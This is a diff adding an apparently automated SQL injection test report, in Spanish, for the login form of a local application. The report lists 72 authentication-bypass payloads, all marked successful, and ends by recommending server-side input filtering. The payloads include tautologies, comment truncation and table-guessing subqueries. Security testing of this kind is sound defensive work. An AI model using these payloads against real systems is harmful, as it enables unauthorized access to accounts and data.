@@ -1,0 +1,164 @@
+DETALLES DE LA PRUEBA DE INYECCIÓN SQL: INICIO DE SESIÓN
+
+
+Fecha y Hora de Creación: 12/05/2016 03:43:50 AM
+Usuario: MIGUEL (Evaluador)
+
+URL Destino del Formulario: http://localhost/sisec/
+Mensaje de Respuesta Invalido: Usuario o contraseña incorrecto
+
+INTENTOS: 
+
+1 => Exitoso: [username=mb1' or 1=1 ORDER BY estatus DESC; --][password=mA123aad222][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+2 => Exitoso: [username=ma1' or 1=1 ORDER BY status DESC; --][password=mA123aad222][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+3 => Exitoso: [username=or 1=1 --][password=or 1=1 #][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+4 => Exitoso: [username=' OR '1'='1][password=' OR '1'='1 ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+5 => Exitoso: [username=' OR '1'='1][password=m2' OR '1'='1 ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+6 => Exitoso: [username=AND user is TRUE; --][password=AND user is TRUE; -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+7 => Exitoso: [username=' OR user LIKE '%a%'; --][password=' AND 1=(SELECT COUNT(*) FROM user); -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+8 => Exitoso: [username=' OR user LIKE '%e%'; --][password=' AND 1=(SELECT COUNT(*) FROM user); -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+9 => Exitoso: [username=' OR user LIKE '%i%'; --][password=' AND 1=(SELECT COUNT(*) FROM user); -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+10 => Exitoso: [username=' OR user LIKE '%o%'; --][password=' AND 1=(SELECT COUNT(*) FROM user); -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+11 => Exitoso: [username=' OR user LIKE '%u%'; --][password=' AND 1=(SELECT COUNT(*) FROM user); -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+12 => Exitoso: [username=' OR usuario LIKE '%a%'; --][password=' AND 1=(SELECT COUNT(*) FROM usuario); -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+13 => Exitoso: [username=' OR usuario LIKE '%e%'; --][password=' AND 1=(SELECT COUNT(*) FROM usuario); -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+14 => Exitoso: [username=' OR usuario LIKE '%i%'; --][password=' AND 1=(SELECT COUNT(*) FROM usuario); -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+15 => Exitoso: [username=' OR usuario LIKE '%o%'; --][password=' AND 1=(SELECT COUNT(*) FROM usuario); -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+16 => Exitoso: [username=' OR usuario LIKE '%u%'; --][password=' AND 1=(SELECT COUNT(*) FROM usuario); -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+17 => Exitoso: [username=' OR username LIKE '%a%'; --][password=' AND 1=(SELECT COUNT(*) FROM username); -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+18 => Exitoso: [username=' OR username LIKE '%e%'; --][password=' AND 1=(SELECT COUNT(*) FROM username); -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+19 => Exitoso: [username=' OR username LIKE '%i%'; --][password=' AND 1=(SELECT COUNT(*) FROM username); -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+20 => Exitoso: [username=' OR username LIKE '%o%'; --][password=' AND 1=(SELECT COUNT(*) FROM username); -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+21 => Exitoso: [username=' OR username LIKE '%u%'; --][password=' AND 1=(SELECT COUNT(*) FROM username); -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+22 => Exitoso: [username=' OR usuarios LIKE '%a%'; --][password=' AND 1=(SELECT COUNT(*) FROM usuarios); -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+23 => Exitoso: [username=' OR usuarios LIKE '%e%'; --][password=' AND 1=(SELECT COUNT(*) FROM usuarios); -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+24 => Exitoso: [username=' OR usuarios LIKE '%i%'; --][password=' AND 1=(SELECT COUNT(*) FROM usuarios); -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+25 => Exitoso: [username=' OR usuarios LIKE '%o%'; --][password=' AND 1=(SELECT COUNT(*) FROM usuarios); -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+26 => Exitoso: [username=' OR usuarios LIKE '%u%'; --][password=' AND 1=(SELECT COUNT(*) FROM usuarios); -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+27 => Exitoso: [username=' OR 1>=(SELECT COUNT(*) FROM usuarios); #][password=' OR 1>=(SELECT COUNT(*) FROM usuarios); #  ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+28 => Exitoso: [username=' OR 1>=(SELECT COUNT(*) FROM usuario); #][password=' OR 1>=(SELECT COUNT(*) FROM usuario); #  ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+29 => Exitoso: [username=' OR 1>=(SELECT COUNT(*) FROM user); #][password=' OR 1>=(SELECT COUNT(*) FROM user); # ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+30 => Exitoso: [username=' OR 1>=(SELECT COUNT(*) FROM username); #][password=' OR 1>=(SELECT COUNT(*) FROM username); # ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+31 => Exitoso: [username=' OR 1>=(SELECT COUNT(*) FROM usernames); #][password=' OR 1>=(SELECT COUNT(*) FROM usernames); # ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+32 => Exitoso: [username=' OR 1>=(SELECT COUNT(*) FROM usuarios); --][password=' OR 1>=(SELECT COUNT(*) FROM usuarios); --  ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+33 => Exitoso: [username=' OR 1>=(SELECT COUNT(*) FROM usuario); --][password=' OR 1>=(SELECT COUNT(*) FROM usuario); -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+34 => Exitoso: [username=' OR 1>=(SELECT COUNT(*) FROM user); --][password=' OR 1>=(SELECT COUNT(*) FROM user); -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+35 => Exitoso: [username=' OR 1>=(SELECT COUNT(*) FROM username); --][password=' OR 1>=(SELECT COUNT(*) FROM username); -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+36 => Exitoso: [username=' OR 1>=(SELECT COUNT(*) FROM usernames); --][password=' OR 1>=(SELECT COUNT(*) FROM usernames); -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+37 => Exitoso: [username=' or 1=1;][password=' or 1=1;][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+38 => Exitoso: [username=' or ''='][password= ' or ''='][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+39 => Exitoso: [username=' or ' '='][password= ' or ' '='][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+40 => Exitoso: [username=' or true--][password= ' or true--][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+41 => Exitoso: [username=" or true--][password= " or true-- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+42 => Exitoso: [username=" or ""="][password= " or ""="][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+43 => Exitoso: [username=" or 1--][password= " or 1-- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+44 => Exitoso: [username=' or 'x'='x][password=' or 'x'='x][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+45 => Exitoso: [username=' or 0=0 --][password=' or 0=0 -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+46 => Exitoso: [username=" or 0=0 --][password=or 0=0 -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+47 => Exitoso: [username=or 0=0 --][password=' or 0=0 # ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+48 => Exitoso: [username=][password=" or 0=0 # ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+49 => Exitoso: [username=][password=or 0=0 # ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+50 => Exitoso: [username=][password=" or "x"="x][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+51 => Exitoso: [username=][password=') or ('x'='x][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+52 => Exitoso: [username=' or 1=1--][password=" or 1=1-- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+53 => Exitoso: [username=or 1=1--][password=or 1=1-- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+54 => Exitoso: [username=' or a=a--][password=" or "a"="a][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+55 => Exitoso: [username=hi" or "a"="a][password=hi" or 1=1 --][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+56 => Exitoso: [username=hi' or 1=1 --][password='or'1=1'][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+57 => Exitoso: [username=and 1=1--][password=and 1=1][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+58 => Exitoso: [username=' or 'one'='one][password=' and 'one'='one][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+59 => Exitoso: [username=' or 'one'='one--][password=' and 'one'='one--][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+60 => Exitoso: [username=admin'; --][password=admin' -- ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+61 => Exitoso: [username=root'; --][password=root' --][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+62 => Exitoso: [username=or 1=1 --][password=or 1=1 # ][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+63 => Exitoso: [username=' or '1'='1][password=' or 'x'='x][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+64 => Exitoso: [username=' or 0=0 --][password=" or 0=0 --][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+65 => Exitoso: [username=' or 0=0 #][password=" or 0=0 #][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+66 => Exitoso: [username=' or 0=0 --][password=" or 0=0 --][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+67 => Exitoso: [username=or 0=0 #][password=or 0=0 #][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+68 => Exitoso: [username=or 0=0 --][password=or 0=0 --][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+69 => Exitoso: [username=' or 'x'='x][password=" or "x"="x][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+70 => Exitoso: [username=' or a=a--][password=" or "a"="a][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+71 => Exitoso: [username=hi" or "a"="a][password=hi" or "a"="a][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+72 => Exitoso: [username='or' 1=1'][password='or' 1=1'][enviar=Iniciar Sesión][submit=Iniciar Sesión]
+
+
+
+TOTAL DE INTENTOS: 72
+INTENTOS EXITOSOS: 72 (1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72)
+INTENTOS FALLIDOS: 0
+
+Tiempo de Ejecución: 0.1926 segundos
+
+RESULTADOS: Se encontró vulnerabilidades mediante la prueba. Aseguruse de incorporar filtracciones de entrada del lado del servidor para eviar este tipo de ataques sensibles a los datos que maneja el sistema evaluado.
